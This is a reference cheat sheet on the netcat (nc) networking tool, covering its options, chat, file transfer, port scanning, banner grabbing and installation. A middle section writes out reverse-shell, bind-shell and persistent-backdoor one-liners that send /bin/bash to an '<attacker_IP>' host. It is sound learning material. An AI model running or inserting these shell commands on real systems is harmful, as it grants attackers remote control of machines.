#command 

**Netcat (`nc`)** is used to **read from and write to network connections** using **TCP** or **UDP**. It is often called the **Swiss Army Knife of Networking** because it can be used for:
```sh
nc [options] <host> <port>
```
- `<host>` → The target IP or domain name.
- `<port>` → The port number to connect to.
---
# **Options**

| Option      | Long Option           | Description                                              |
| ----------- | --------------------- | -------------------------------------------------------- |
| `-l`        | `--listen`            | Listen mode (waits for incoming connections).            |
| `-p <port>` | `--port <port>`       | Specify the port number to use.                          |
| `-v`        | `--verbose`           | Verbose mode (shows connection details).                 |
| `-vv`       | `--verbose --verbose` | Very verbose mode (more detailed output).                |
| `-n`        | `--numeric-only`      | Do not resolve hostnames (avoids DNS lookups).           |
| `-w <sec>`  | `--wait <sec>`        | Set timeout for connections. (in seconds).               |
| `-u`        | `--udp`               | Use UDP instead of TCP.                                  |
| `-z`        | `--zero`              | Scan mode (does not send data, used for port scanning).  |
| `-e <cmd>`  | `--exec <cmd>`        | Execute a command upon connection.                       |
| `-q <sec>`  | `--quit <sec>`        | Quit after EOF on stdin and timeout.                     |
| `-c <cmd>`  | `--sh-exec <cmd>`     | Run a shell command and send output over the connection. |
| `-k`        | `--keep-open`         | Keep listening after client disconnects.                 |
| `-i <sec>`  | `--interval <sec>`    | Interval between sending lines.                          |

---
# **Usage**

### **Chat Between Two Machines**
```sh
# On Machine A (listening server)
$ nc -lp 5000

# On Machine B (client)
$ nc <Machine_A_IP> 5000
```
Now both machines can chat in real-time.
### **File Transfer**
```bash
# Transfer a file (receiver)
$ nc -lvp 2200 > file.txt

# Transfer a file (sender)
$ nc 192.168.1.12 2200 < file.txt
$ cat file.txt | nc 192.168.1.12 1234 # Alternative

# Transfer a File (Sender - Progress Bar)
$ pv file.txt | nc <receiver_IP> 1234
54.0 B 0:00:00 [1.61MiB/s] [===================>] 100%
```

### **Port Scanning with Netcat**
```sh
# Scan Ports 20-100 on a Host
$ nc -zv 192.168.1.5 20-100
Connection to 192.168.1.5 22 port [tcp/ssh] succeeded!
Connection to 192.168.1.5 80 port [tcp/http] succeeded!

# Scan one port
$ nc -zv 192.168.1.5 203
nc: connect to 192.168.1.5 23 (tcp) failed: Connection refused
```
### **Banner Grabbing (Service Detection)**
```sh
# Get SMTP Banner
$ nc -v 192.168.1.1 25
Connection to 192.168.1.1 25 port [tcp/smtp] succeeded!
220 mail.example.com ESMTP Postfix
```
### **Creating a Reverse Shell**
```sh
# On the Attacker's Machine (Listening for a Connection)
$ nc -lp 4444 

# On the Victim's Machine (Sending a Shell Back)
$ nc <attacker_IP> 4444 -e /bin/bash
```
- `-e /bin/bash` → Executes `/bin/bash` on the target machine.
Now, the attacker has **shell access**.

---

```bash
# Execute a command remotely (reverse shell)
$ nc -e /bin/bash <attacker-ip> 4444
(Attacker receives shell access)

# UDP listener on port 5000
$ nc -ulvp 5000
Listening on [any] 5000 (UDP) ...

# Port scanning (scan ports 20-100 on a target)
$ nc -zv <target-ip> 20-100
(Shows open ports)

# Chat between two machines (listener)
$ nc -lvp 2200

# Chat between two machines (client)
$ nc <target-ip> 2200
(Whatever one types is received by the other)

# Send a message to a listening server
$ echo "Hello" | nc <target-ip> 2200

# Create a persistent backdoor
$ while true; do nc -lvp 4444 -e /bin/bash; done

# Bind shell (server listens, attacker connects)
$ nc -lvp 4444 -e /bin/bash
(Attacker connects to <target-ip>:4444 for shell access)
```
### **Running a TCP Server**
```bash
# Simple TCP server (listens on port 2200)
$ nc -lvp 2200
Listening on [any] 2200 ...

# Connect to a server (192.168.1.3) on port 2200
$ nc 192.168.1.3 2200 

# Server will close after 15 seconds
$ nc -lw 15 -p 2200
```
### **Connecting to a Server (Basic TCP Client)**
You can use Netcat to manually connect to a **remote service** over TCP.
```sh
# Connect to a Web Server (Port 80)
$ nc example.com 80
```
Then type:
```
GET / HTTP/1.1
Host: example.com
```
(Press **Enter** twice to send the request.)  
It will return the HTTP response from the server.

---
# **Netcat Alternatives**
- **Nmap** (for advanced port scanning)
- **socat** (more powerful alternative)
- **Telnet** (for basic connections)
- **OpenSSL** (for encrypted connections)
---
# **Installation**
```sh
sudo pacman -S gnu-netcat -y
sudo apt install netcat -y
sudo dnf install nc -y
sudo yum install nc -y
brew install netcat
```
- **Windows (via Nmap's Ncat)**:  
    Download Nmap (includes `ncat`) from [nmap.org](https://nmap.org/download.html).

---
# **Differences Between `nc`, `ncat`, `socat`**

|Tool|Features|
|---|---|
|`nc` (Netcat)|Basic networking tool, lightweight but lacks encryption.|
|`ncat` (from Nmap)|Secure version with SSL/TLS, proxy support, and logging.|
|`socat`|More advanced, allows bidirectional data streams, tunneling, and file transfers.|
# **Etymology**
Netcat is called **"netcat"** because it acts like the **network version of the Unix "cat" command**.
1. **"Net"** – It works over the network (TCP/UDP).
2. **"Cat"** – In Unix, `cat` is used to read/write data from files or input/output streams. Netcat does the same but over network connections.
Essentially, **Netcat** allows reading/writing raw data between network sockets, just like `cat` does with files. This makes it useful for port scanning, file transfers, remote execution, and debugging.